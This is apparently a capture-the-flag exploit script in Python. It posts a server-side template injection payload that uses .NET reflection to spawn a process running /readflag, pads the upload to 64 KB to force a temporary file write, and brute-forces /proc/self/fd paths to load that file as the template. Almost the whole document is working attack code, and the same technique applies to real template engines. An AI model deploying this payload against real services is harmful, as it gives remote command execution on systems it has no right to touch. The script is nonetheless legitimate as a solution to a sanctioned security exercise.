import requests

base_url = 'http://127.0.0.1:3000'
base_url = 'https://etaas-d18f10dd80b8ebd6.instancer.challs.mt'
template = """
#set($a = "")
#set($activator_type = $a.GetType().Assembly.GetType("System.Activator"))
#set($create_instance = $activator_type.GetMethods().Get(8))
#set($args = ["System.Diagnostics.Process, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Diagnostics.Process"])
#set($wrapped_process = $create_instance.Invoke(null, $args.ToArray()))
#set($process = $wrapped_process.Unwrap())

#set($args = ["System.Diagnostics.Process, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Diagnostics.ProcessStartInfo"])
#set($wrapped_process_start_info = $create_instance.Invoke(null, $args.ToArray()))
#set($process_start_info = $wrapped_process_start_info.Unwrap())

#set($process_start_info.FileName = "/readflag")
#set($process_start_info.RedirectStandardOutput = true)

#set($flag = $process.Start($process_start_info))
$!flag.StandardOutput.ReadToEnd()
"""
session = requests.Session()

for i in range(170, 250):
    try:
        res = session.post(base_url, data = {
            # 'template': '/proc/self/fd/216', # this works local but not on remote, but bruteforcing FD is reasonable anyway
            'template': f'/proc/self/fd/{i}',
        }, files = {
            'file': template.encode() + b'A'*1024*64, # 64 KB is the boundary to trigger temp file write
        }, timeout=1)
        print(i, res.status_code, res.content[0:128])
        if b'maltactf{' in res.content:
            break
    except:
        pass
